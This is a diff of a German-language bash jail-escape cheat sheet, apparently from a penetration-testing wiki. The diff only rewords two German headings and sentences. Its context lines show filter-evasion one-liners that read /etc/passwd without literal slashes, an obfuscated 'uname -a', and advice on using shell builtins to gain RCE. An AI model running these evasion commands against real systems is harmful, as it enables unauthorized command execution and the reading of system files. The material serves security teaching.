@@ -106,7 +106,7 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Umgehung von Backslash und Slash
+### Umgehen von Backslash und Slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -145,7 +145,7 @@ Sie könnten **burpcollab** oder [**pingb**](http://pingb.in) verwenden, zum Bei
 
 ### Builtins
 
-Falls Sie externe Funktionen nicht ausführen können und nur Zugriff auf eine **begrenzte Menge an Builtins haben, um RCE zu erhalten**, gibt es einige nützliche Tricks, um dies zu tun. Normalerweise **werden Sie nicht alle** der **Builtins verwenden können**, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Jail zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
+Falls Sie externe Funktionen nicht ausführen können und nur Zugriff auf eine **begrenzte Menge an Builtins haben, um RCE zu erhalten**, gibt es einige nützliche Tricks, um dies zu tun. Normalerweise **werden Sie nicht in der Lage sein, alle** der **Builtins** zu verwenden, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Jail zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
 Zuerst überprüfen Sie alle [**Shell Builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Dann haben Sie hier einige **Empfehlungen**:
 ```bash
 # Get list of builtins
